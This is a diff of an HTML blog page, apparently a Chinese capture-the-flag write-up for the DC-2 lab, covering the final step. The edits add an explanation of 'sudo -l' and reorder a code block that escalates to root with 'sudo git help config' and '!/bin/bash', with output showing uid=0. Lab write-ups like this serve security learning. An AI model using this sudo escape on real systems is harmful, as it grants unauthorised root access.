@@ -386,7 +386,7 @@ bash: PATH:/bin:/sbin:/usr/bin:/usr/sbin: No such file or directory</code></pre>
 
 <blockquote>
 <p><strong>/bin目录:</strong> </p>
-<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/" target="_blank" rel="noopener">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p>
+<p>bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p>
 <p><strong>/usr/bin目录:</strong></p>
 <p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome<em>、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb</em>、wget等。</p>
 <p><strong>/sbin目录:</strong> </p>
@@ -419,7 +419,8 @@ No hints here - you<span class="hljs-string">'re on your own now.  :-)
 Go on - git outta here!!!!</span></code></pre>
 
 <p>flag4的提示是说要用git，应该是最后的flag需要用git这个命令去提权到root</p>
-<h2 id="git提权（final-flag）"><a href="#git提权（final-flag）" class="headerlink" title="git提权（final-flag）"></a>git提权（final-flag）</h2><pre><code class="hljs bash">jerry@DC-2:~$ sudo -l
+<h2 id="git提权（final-flag）"><a href="#git提权（final-flag）" class="headerlink" title="git提权（final-flag）"></a>git提权（final-flag）</h2><p>这里的sudo -l的意思是，sudo git不需要输入密码直接使用，而其他的（sudo command）需要输入root密码使用</p>
+<pre><code class="hljs bash">jerry@DC-2:~$ sudo -l
 Matching Defaults entries <span class="hljs-keyword">for</span> jerry on DC-2:
     env_reset, mail_badpass, secure_path=/usr/<span class="hljs-built_in">local</span>/sbin\:/usr/<span class="hljs-built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -431,15 +432,15 @@ User jerry may run the following commands on DC-2:
 <p>-l, –list                  list user’s privileges or check a specific command; use twice for longer format</p>
 <p>显示出自己（执行 sudo 的使用者）的权限</p>
 </blockquote>
+<pre><code class="hljs bash">jerry@DC-2:~$ sudo git <span class="hljs-built_in">help</span> config
+root@DC-2:/home/jerry<span class="hljs-comment"># id</span>
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
 <blockquote>
 <p><strong>sudo git help config</strong> </p>
 <p><strong>!/bin/bash</strong>或者！’sh’完成提权 </p>
 <p>sudo git  -p help !/bin/bash</p>
 </blockquote>
-<pre><code class="hljs bash">jerry@DC-2:~$ sudo git <span class="hljs-built_in">help</span> config
-root@DC-2:/home/jerry<span class="hljs-comment"># id</span>
-uid=0(root) gid=0(root) groups=0(root)</code></pre>
-
 <p>拿到最后的flag</p>
 <pre><code class="hljs bash">root@DC-2:~<span class="hljs-comment"># cat final-flag.txt </span>
  __    __     _ _       _                    _ 
